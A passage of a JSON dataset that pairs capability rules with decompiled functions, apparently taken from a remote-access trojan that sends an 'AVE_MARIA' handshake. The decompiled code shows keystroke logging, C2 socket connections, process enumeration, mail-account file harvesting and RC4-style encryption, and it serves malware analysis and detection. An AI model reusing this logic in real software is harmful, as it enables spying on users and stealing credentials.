uStackY80 = 0x85239;\n        fcn.00085b00(puVar4, uVar1, arg_10h_00, puVar5);\n        fcn.00082d8c();\n        fcn.00082d5a(&fcn.000850cc::buf, arg_ch);\n        fcn.00082d8c();\n        fcn.00082d8c();\n        fcn.00084a77(arg_8h);\n        fcn.00082dff();\n    } while( true );\n}\n",
        "token_count": 1113
    },
    "00085294": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00085294(uint pNodeName, uint hostshort)\n\n{\n    ushort uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    uint *puVar4;\n    uint uVar5;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t pAddrInfo;\n    \n    pAddrInfo = 0;\n    fcn.00082eeb(&pNodeName);\n    *(in_ECX + 4) = hostshort;\n    fcn.0008dd97();\n    puVar4 = &var_24h;\n    for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    var_18h = 6;\n    uVar5 = 1;\n    var_1ch = 1;\n    iVar3 = (*_sym.imp.WS2_32.dll_getaddrinfo)(pNodeName, 0, &var_24h, &pAddrInfo);\n    if (iVar3 == 0) {\n        iVar3 = *(pAddrInfo + 0x18);\n        iVar2 = (*_sym.imp.WS2_32.dll_socket)(2, 1, 0);\n        *(in_ECX + 0xc) = iVar2;\n        if (iVar2 != -1) {\n            *(in_ECX + 0x1cc) = *(iVar3 + 4);\n            *(in_ECX + 0x1c8) = 2;\n            uVar1 = (*_sym.imp.WS2_32.dll_htons)(hostshort);\n            *(in_ECX + 0x1ca) = uVar1;\n            (*_sym.imp.WS2_32.dll_freeaddrinfo)(pAddrInfo);\n            iVar3 = (*_sym.imp.WS2_32.dll_connect)(*(in_ECX + 0xc), in_ECX + 0x1c8, 0x10);\n            if (iVar3 != -1) {\n                *(in_ECX + 8) = 1;\n                (*_sym.imp.KERNEL32.dll_ReleaseMutex)(*(in_ECX + 0x1d8));\n                goto code_r0x0008534a;\n            }\n            *(in_ECX + 0xc) = 0xffffffff;\n        }\n    }\n    uVar5 = 0;\ncode_r0x0008534a:\n    fcn.000858fb();\n    return uVar5;\n}\n",
        "token_count": 572
    },
    "00087b2e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00087b2e(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    uint unaff_EBX;\n    int32_t unaff_ESI;\n    uint uVar6;\n    uchar *arg_8h_00;\n    uchar *arg_8h_01;\n    uint uVar7;\n    ushort uVar8;\n    uint arg_18h;\n    uint uStack604;\n    uint uStack600;\n    int32_t iStack596;\n    uint uStack592;\n    ushort uStack576;\n    ushort uStack574;\n    uint uStack572;\n    uint uStack568;\n    ushort uStack564;\n    uchar auStack560 [16];\n    uchar auStack544 [16];\n    uchar auStack528 [44];\n    uchar auStack484 [480];\n    \n    uVar6 = 0;\n    uStack604 = 0;\n    fcn.00081052(&stack0xfffffdf0, 0, 0x208);\n    if (arg_ch == 1) {\n        uStack574 = 6;\n        uStack568 = arg_8h;\n        uStack572 = 0x130;\n        uStack576 = 1;\n        (*_sym.imp.USER32.dll_RegisterRawInputDevices)(&stack0xfffffdc0, 1, 0xc);\n        goto code_r0x00087eb6;\n    }\n    if (arg_ch == 0x10) {\n        (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n        goto code_r0x00087eb6;\n    }\n    if (arg_ch != 0xff) {\n        uVar6 = (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n        goto code_r0x00087eb6;\n    }\n    uVar7 = 0x10;\n    iVar2 = (*_sym.imp.USER32.dll_GetRawInputData)(arg_14h, 0x10000003, 0, &stack0xfffffda4);\n    if (iVar2 == -1) goto code_r0x00087eb6;\n    iVar2 = fcn.000859a9();\n    iStack596 = iVar2;\n    if (iVar2 == 0) goto code_r0x00087eb6;\n    iVar3 = (*_sym.imp.USER32.dll_GetRawInputData)(arg_14h, 0x10000003, iVar2, &stack0xfffffd94, 0x10);\n    if ((iVar3 != unaff_ESI) || (*(iVar2 + 0x18) != 0x100)) goto code_r0x00087eb6;\n    uVar4 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n    uVar8 = unaff_ESI >> 0x10;\n    iVar2 = (*_sym.imp.USER32.dll_GetWindowTextW)(uVar4, &stack0xfffffde0, 0x104);\n    if (iVar2 < 1) {\n        fcn.000830c5(L\"Unknow\");\n    }\n    else {\n        uVar4 = fcn.000833ab(&stack0xfffffe1c);\n        uStack592 = 0x87c27;\n        fcn.000831fd(uVar4);\n        uStack592 = 0x87c30;\n        fcn.000858fb();\n    }\n    fcn.00087fae();\n    uStack592 = 0x87c5a;\n    fcn.000831fd(&stack0xfffffdc8);\n    iStack596 = 0x87c6c;\n    fcn.00083230(*0x966ac + 4);\n    if (**0x966ac != 0) {\n        unaff_EBX = 0x87c85;\n        fcn.00081301(*0x966ac + 0x286);\n        arg_8h_01 = &stack0xfffffdc8;\n        fcn.000833f3(arg_8h_01);\n        arg_18h = CONCAT22(uVar8, uStack564);\n        arg_8h_00 = &stack0xfffffdd0;\n        uVar4 = uStack568;\n        fcn.000833f3(arg_8h_00);\n        uVar7 = fcn.000844f4(arg_8h_00, arg_8h_01, uVar7, uVar4, arg_18h);\n        fcn.00084a3d(uVar7);\n        fcn.000844ca();\n    }\n    if ((*0x966ac)[0x285] != 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(*0x966ac + 0x84);\n        if (iVar2 == 0) {\ncode_r0x00087d39:\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(*0x966ac + 0x84, unaff_EBX);\n            piVar5 = *0x966ac;\n            (*0x966ac)[0x284] = 0;\n        }\n        else {\n            uVar7 = fcn.000833ab(*0x966ac + 0x84);\n            iVar2 = fcn.0008300e(uVar7);\n            fcn.000858fb();\n            piVar5 = *0x966ac;\n            if (iVar2 == 0) goto code_r0x00087d39;\n            (*0x966ac)[0x284] = 1;\n        }\n        iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(piVar5[3], 4, 1, 0, 4, 0x80, 0);\n        piVar5 = *0x966ac;\n        pcVar1 = _sym.imp.KERNEL32.dll_WriteFile;\n        (*0x966ac)[1] = iVar2;\n        if (piVar5[0x284] == 0) {\n            uVar7 = (*_sym.imp.KERNEL32.dll_lstrlenW)(600000, piVar5 + 2, 0);\n            uVar4 = 600000;\n            (*pcVar1)((*0x966ac)[1], 600000, uVar7);\n            uVar7 = (*_sym.imp.KERNEL32.dll_lstrlenW)(600000, *0x966ac + 2, 0);\n            (*pcVar1)((*0x966ac)[1], 600000, uVar7);\n            iVar2 = fcn.00083027(*0x966ac + 2, 0);\n            (*pcVar1)((*0x966ac)[1], uVar4, iVar2 * 2);\n            uVar7 = (*_sym.imp.KERNEL32.dll_lstrlenW)(600000, *0x966ac + 2, 0);\n            (*pcVar1)((*0x966ac)[1], 600000, uVar7);\n            uVar7 = (*_sym.imp.KERNEL32.dll_lstrlenW)(600000, *0x966ac + 2, 0);\n            (*pcVar1)((*0x966ac)[1], 600000, uVar7);\n            piVar5 = *0x966ac;\n        }\n        uVar7 = fcn.00087ec8(piVar5 + 2, 0);\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(uVar7);\n        uVar7 = fcn.00087ec8(iVar2 * 2);\n        (*pcVar1)((*0x966ac)[1], uVar7);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)((*0x966ac)[1]);\n    }\n    fcn.000858fb();\n    uStack600 = 0;\n    fcn.000858fb();\ncode_r0x00087eb6:\n    fcn.000858fb();\n    return uVar6;\n}\n",
        "token_count": 1784
    },
    "00088917": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00088917(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint lpFileName;\n    uint var_354h;\n    uint32_t lpFindFileData;\n    uint var_220h;\n    uint var_10ch;\n    \n    (*_sym.imp.KERNEL32.dll_GetFullPathNameA)(0x966b0, 0x104, &var_354h, 0);\n    pcVar1 = _sym.imp.SHLWAPI.dll_PathCombineA;\n    (*_sym.imp.SHLWAPI.dll_PathCombineA)(&lpFileName, &var_354h, 0x93500);\n    iVar2 = (*_sym.imp.KERNEL32.dll_FindFirstFileA)(&lpFileName, &lpFindFileData);\n    if (iVar2 != -1) {\n        do {\n            if (((lpFindFileData | 0x10) == 0x10) && (var_220h != '.')) {\n                (*pcVar1)(&var_10ch, 0x966b0, &var_220h);\n                (*pcVar1)(&var_10ch, &var_10ch, \"Accounts\\\\Account.rec0\");\n                fcn.00088606(&var_10ch);\n            }\n            iVar3 = (*_sym.imp.KERNEL32.dll_FindNextFileA)(iVar2, &lpFindFileData);\n        } while (iVar3 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 337
    },
    "0008b1e8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0008b1e8(uint *arg_8h)\n\n{\n    char cVar1;\n    int32_t buf;\n    uint var_1000h;\n    uint uStackY32;\n    uint uStackY28;\n    uint *puStackY24;\n    uint uStackY20;\n    \n    fcn.00081130();\n    puStackY24 = &fcn.0008b1e8::var_1000h;\n    uStackY20 = 0;\n    uStackY28 = 0x8b20b;\n    fcn.00081052();\n    while( true ) {\n        puStackY24 = &fcn.0008b1e8::var_1000h;\n        uStackY20 = 0x1000;\n        uStackY28 = *arg_8h;\n        uStackY32 = 0x8b248;\n        buf = (*_sym.imp.WS2_32.dll_recv)();\n        if (buf == -1) {\n            return 0;\n        }\n        uStackY20 = 0x8b21f;\n        cVar1 = fcn.0008b3f2(buf);\n        if (cVar1 == '\\0') break;\n        puStackY24 = &fcn.0008b1e8::var_1000h;\n        uStackY20 = 0;\n        uStackY28 = 0x8b233;\n        fcn.00081052();\n    }\n    return 0;\n}\n",
        "token_count": 330
    },
    "0008b255": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0008b255(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t buf;\n    uint var_1000h;\n    uint uStackY32;\n    uint uStackY28;\n    uint *puStackY24;\n    uint uStackY20;\n    \n    fcn.00081130();\n    puStackY24 = &fcn.0008b255::var_1000h;\n    uStackY20 = 0;\n    uStackY28 = 0x8b278;\n    fcn.00081052();\n    while( true ) {\n        puStackY24 = &fcn.0008b255::var_1000h;\n        uStackY20 = 0x1000;\n        uStackY28 = *(arg_8h + 4);\n        uStackY32 = 0x8b2b5;\n        buf = (*_sym.imp.WS2_32.dll_recv)();\n        if (buf == -1) {\n            return 0;\n        }\n        uStackY20 = 0x8b28b;\n        cVar1 = fcn.0008b3f2(buf);\n        if (cVar1 == '\\0') break;\n        puStackY24 = &fcn.0008b255::var_1000h;\n        uStackY20 = 0;\n        uStackY28 = 0x8b29f;\n        fcn.00081052();\n    }\n    return 0;\n}\n",
        "token_count": 328
    },
    "0008ce39": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0008ce39(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar2 = arg_8h;\n    iVar3 = fcn.0008d105();\n    if ((iVar3 != -1) &&\n       (iVar4 = (*_sym.imp.WS2_32.dll_send)(iVar3, \"AVE_MARIA\\x01\", 10, 0),  pcVar1 = _sym.imp.WS2_32.dll_recv, \n       0 < iVar4)) {\n        while( true ) {\n            arg_8h = 0;\n            iVar4 = (*pcVar1)(iVar3, &arg_8h, 4, 0);\n            if (iVar4 < 1) break;\n            *(iVar2 + 0x104) = arg_8h;\n            (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0008ceb6, iVar2, 0, 0);\n        }\n    }\n    fcn.000810c1(iVar2);\n    return 0;\n}\n",
        "token_count": 261
    },
    "0008d105": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0008d105(uint param_1, uint param_2)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uStack452;\n    uint32_t uStack448;\n    uchar *puStack444;\n    uchar auStack408 [404];\n    \n    puStack444 = &stack0xfffffe68;\n    uStack448 = 0x202;\n    uStack452 = 0x8d128;\n    uStack452 = (*_sym.imp.WS2_32.dll_WSAStartup)();\n    if ((uStack452 == 0) && (iVar2 = (*_sym.imp.WS2_32.dll_socket)(2, 1),  iVar2 != -1)) {\n        iVar3 = (*_sym.imp.WS2_32.dll_gethostbyname)(param_1);\n        fcn.0008102c(&stack0xfffffe44, **(iVar3 + 0xc), *(iVar3 + 10));\n        uStack448 = uStack448 & 0xffff0000 | 2;\n        uVar1 = (*_sym.imp.WS2_32.dll_htons)(param_2);\n        uStack452 = uStack452 & 0xffff | uVar1 << 0x10;\n        iVar3 = (*_sym.imp.WS2_32.dll_connect)(iVar2, &stack0xfffffe3c, 0x10);\n        if (iVar3 == 0) {\n            return iVar2;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 343
    },
    "0008d450": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0008d450(uint *param_1, uint *param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(*param_1, 0, 2);\n    if (((iVar2 != -1) && (iVar3 = (*_sym.imp.KERNEL32.dll_FindResourceW)(iVar2, 1, 0x10),  iVar3 != 0)) &&\n       (iVar3 = (*_sym.imp.KERNEL32.dll_LoadResource)(iVar2, iVar3),  iVar3 != 0)) {\n        uVar1 = *(iVar3 + 0x28);\n        *param_2 = *(iVar3 + 0x14);\n        *(param_2 + 1) = *(iVar3 + 0x1a);\n        *(param_2 + 6) = *(iVar3 + 0x18);\n        param_2[2] = uVar1 & 1;\n        param_2[3] = uVar1 >> 1 & 1;\n        param_2[4] = uVar1 >> 3 & 1;\n        param_2[5] = uVar1 >> 5 & 1;\n        (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar2);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 314
    },
    "0008d918": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0008d918(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileW)(*(param_1 + 4), 0xc0000000, 1, 0, 1, 0, 0);\n    *(param_1 + 8) = iVar1;\n    if ((iVar1 == -1) && (iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar1 == 0x50)) {\n        *(param_1 + 8) = 0;\n        uVar2 = fcn.0008dcba(0xc0000000);\n        return uVar2;\n    }\n    return *(param_1 + 8) != -1;\n}\n",
        "token_count": 187
    },
    "0008da4f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0008da4f(uint lpFileName)\n\n{\n    int32_t iVar1;\n    uint arg_8h;\n    int32_t iVar2;\n    bool bVar3;\n    uint *arg_8h_00;\n    uint in_stack_fffffd40;\n    uint in_stack_fffffd44;\n    uint lpFindFileData;\n    uint var_268h;\n    uint var_264h;\n    uint var_258h;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    var_10h = 0;\n    var_ch = 5;\n    var_14h = 5;\n    fcn.00081815();\n    iVar1 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n    bVar3 = iVar1 == -1;\n    while (!bVar3) {\n        var_34h = 0;\n        bVar3 = (lpFindFileData & 0x10) == 0;\n        if (bVar3) {\n            _var_2ch = CONCAT44(var_268h, var_264h);\n        }\n        else {\n            _var_2ch = 0;\n        }\n        var_24h = !bVar3;\n        arg_8h = fcn.000833ab(&var_258h);\n        fcn.000831fd(arg_8h);\n        fcn.000858fb();\n        var_8h = 0;\n        arg_8h_00 = &var_34h;\n        fcn.000833f3(arg_8h_00);\n        fcn.00081716(arg_8h_00, in_stack_fffffd40, in_stack_fffffd44, var_2ch, var_28h);\n        fcn.000858fb();\n        iVar2 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(iVar1, &lpFindFileData);\n        bVar3 = iVar2 == 0;\n    }\n    fcn.00081301(&var_18h);\n    if (var_18h != 0) {\n        fcn.00081a75(var_18h);\n    }\n    fcn.000858fb();\n    return;\n}\n",
        "token_count": 551
    },
    "0008dcba": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0008dcba(uint dwDesiredAccess)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileW)(*(in_ECX + 4), dwDesiredAccess, 1, 0, 3, 0, 0);\n    *(in_ECX + 8) = iVar1;\n    if (iVar1 == -1) {\n        *(in_ECX + 8) = 0;\n    }\n    else {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetFileSize)(iVar1, 0);\n        *(in_ECX + 0x14) = uVar2;\n    }\n    return iVar1 != -1;\n}\n",
        "token_count": 174
    },
    "0008dcf9": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0008dcf9(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileW)(*(param_1 + 4), 0x40000000, 1, 0, 2, 0, 0);\n    *(param_1 + 8) = iVar1;\n    if (iVar1 == -1) {\n        *(param_1 + 8) = 0;\n    }\n    return iVar1 != -1;\n}\n",
        "token_count": 121
    },
    "0008ddc0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0008ddc0(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateMutexA)(0, 0, 0);\n    *param_1 = iVar1;\n    param_1[1] = iVar1 != -1;\n    return param_1;\n}\n",
        "token_count": 86
    },
    "0008e764": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.0008e764(uint *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_22ch;\n    int32_t var_224h;\n    uint var_208h;\n    \n    var_22ch = 0x22c;\n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2, 0);\n    if (iVar1 != -1) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_Process32FirstW)(iVar1, &var_22ch);\n        while (iVar2 != 0) {\n            if (var_224h == param_2) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n                fcn.000833ab(&var_208h);\n                return param_1;\n            }\n            iVar2 = (*_sym.imp.KERNEL32.dll_Process32NextW)(iVar1, &var_22ch);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    }\n    *param_1 = 0;\n    return param_1;\n}\n",
        "token_count": 255
    },
    "0008e80f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0008e80f(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *arg_8h;\n    uint *arg_8h_00;\n    uint var_668h;\n    uint var_258h;\n    uint var_254h;\n    uint dwProcessId;\n    uint var_234h;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00081052(&var_254h, 0, 0x228);\n    var_258h = 0x22c;\n    var_20h = 0;\n    var_1ch = 5;\n    var_24h = 5;\n    fcn.00081683();\n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2, 0);\n    if (iVar1 != -1) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_Process32FirstW)(iVar1, &var_258h);\n        if (iVar2 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            fcn.000812ba(&var_28h);\n            if (var_28h == 0) {\n                return param_1;\n            }\n            for (iVar1 = *(var_28h + -4); iVar1 != 0; iVar1 = iVar1 + -1) {\n                fcn.000813b6();\n            }\n            return param_1;\n        }\n        do {\n            var_8h = 0;\n            var_ch = dwProcessId;\n            var_4h = var_8h;\n            fcn.000830c5(&var_234h);\n            iVar2 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x1000, 0, dwProcessId);\n            if (iVar2 == -1) {\n                uVar4 = fcn.000833ab(0x92904);\n                fcn.000831fd(uVar4);\n                fcn.000858fb();\n                var_18h = 0;\n            }\n            else {\n                fcn.00081052(&var_668h, 0, 0x410);\n                iVar3 = (*_sym.imp.PSAPI.DLL_GetModuleFileNameExW)(iVar2, 0, &var_668h, 0x208);\n                if (iVar3 == 0) {\n                    uVar4 = fcn.000833ab(0x92904);\n                    fcn.000831fd(uVar4);\n                    fcn.000858fb();\n                    var_14h = 0;\n                }\n                else {\n                    uVar4 = fcn.000833ab(&var_668h);\n                    fcn.000831fd(uVar4);\n                    fcn.000858fb();\n                    var_10h = 0;\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n            }\n            arg_8h_00 = &var_8h;\n            uVar4 = var_ch;\n            fcn.000833f3(arg_8h_00);\n            arg_8h = &var_4h;\n            fcn.000833f3(arg_8h);\n            fcn.00081560(arg_8h, arg_8h_00, uVar4);\n            fcn.000813b6();\n            iVar2 = (*_sym.imp.KERNEL32.dll_Process32NextW)(iVar1, &var_258h);\n        } while (iVar2 != 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    }\n    fcn.000812ba(&var_28h);\n    if (var_28h != 0) {\n        for (iVar1 = *(var_28h + -4); iVar1 != 0; iVar1 = iVar1 + -1) {\n            fcn.000813b6();\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 939
    },
    "0008f52a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0008f52a(uint nNumberOfBytesToWrite)\n\n{\n    int32_t iVar1;\n    uint lpNumberOfBytesWritten;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileW)();\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_WriteFile)(iVar1);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    }\n    return;\n}\n",
        "token_count": 97
    },
    "0008549d": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nvoid fcn.0008549d(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_90h;\n    uint var_44h;\n    uint var_1ch;\n    int32_t *var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    fcn.0008df77();\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0);\n    fcn.0008de6e(uVar1);\n    uVar1 = fcn.00083185(0x92628);\n    fcn.0008dde1(&var_44h, uVar1);\n    fcn.000858fb();\n    fcn.00082e12(&var_1ch);\n    fcn.00082c65(&var_ch);\n    fcn.00082dff();\n    fcn.000853f7(&var_14h);\n    iVar3 = *var_14h;\n    uVar1 = fcn.0008f56d(iVar3);\n    fcn.000831fd(uVar1);\n    fcn.000858fb();\n    var_4h[5] = *(var_14h + iVar3 + 4);\n    iVar2 = *(var_14h + iVar3 + 8);\n    uVar1 = fcn.0008f56d(iVar2);\n    fcn.000831fd(uVar1);\n    fcn.000858fb();\n    iVar2 = iVar3 + 0xc + iVar2;\n    var_4h[6] = *(var_14h + iVar2);\n    iVar3 = *(var_14h + iVar2 + 1);\n    uVar1 = fcn.0008f56d(iVar3);\n    fcn.000831fd(uVar1);\n    fcn.000858fb();\n    iVar3 = iVar2 + 5 + iVar3;\n    var_4h[8] = *(var_14h + iVar3);\n    iVar2 = *(var_14h + iVar3 + 1);\n    uVar1 = fcn.0008f56d(iVar2);\n    fcn.000831fd(uVar1);\n    fcn.000858fb();\n    iVar2 = iVar3 + 5 + iVar2;\n    var_4h[0xb] = *(var_14h + iVar2);\n    var_4h[0xd] = *(var_14h + iVar2 + 4);\n    var_4h[0xe] = *(var_14h + iVar2 + 5);\n    fcn.0008f56d(*(var_14h + iVar2 + 6));\n    fcn.000831fd(&var_4h);\n    *var_4h = 1;\n    var_4h[1] = 1;\n    fcn.000858fb();\n    fcn.00082dff();\n    fcn.00082dff();\n    fcn.00081da8();\n    return;\n}\n",
        "token_count": 672
    },
    "000859f7": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000859f7(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    uint8_t *in_EDX;\n    uint32_t uVar3;\n    uint8_t *var_4h;\n    \n    uVar3 = 0;\n    uVar2 = 0;\n    var_4h = in_EDX;\n    for (; 0 < arg_8h; arg_8h = arg_8h + -1) {\n        uVar3 = uVar3 + 1 & 0x800000ff;\n        if (uVar3 < 0) {\n            uVar3 = (uVar3 - 1 | 0xffffff00) + 1;\n        }\n        uVar1 = *(uVar3 + in_ECX);\n        uVar2 = uVar2 + uVar1 & 0x800000ff;\n        if (uVar2 < 0) {\n            uVar2 = (uVar2 - 1 | 0xffffff00) + 1;\n        }\n        *(uVar3 + in_ECX) = *(uVar2 + in_ECX);\n        *(uVar2 + in_ECX) = uVar1;\n        *var_4h = *var_4h ^ *((*(uVar3 + in_ECX) + uVar1 & 0xff) + in_ECX);\n        var_4h = var_4h + 1;\n    }\n    return;\n}\n",
        "token_count": 338
    },
    "00085a64": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00085a64(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar2 = 0;\n    iVar3 = 0;\n    do {\n        uVar1 = *(iVar3 + in_ECX);\n        uVar2 = uVar2 + *(iVar3 % arg_8h + in_EDX) + uVar1 & 0x800000ff;\n        if (uVar2 < 0) {\n            uVar2 = (uVar2 - 1 | 0xffffff00) + 1;\n        }\n        *(iVar3 + in_ECX) = *(uVar2 + in_ECX);\n        iVar3 = iVar3 + 1;\n        *(uVar2 + in_ECX) = uVar1;\n    } while (iVar3 < 0x100);\n    return;\n}\n",
        "token_count": 234
    },
    "00085c1b": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
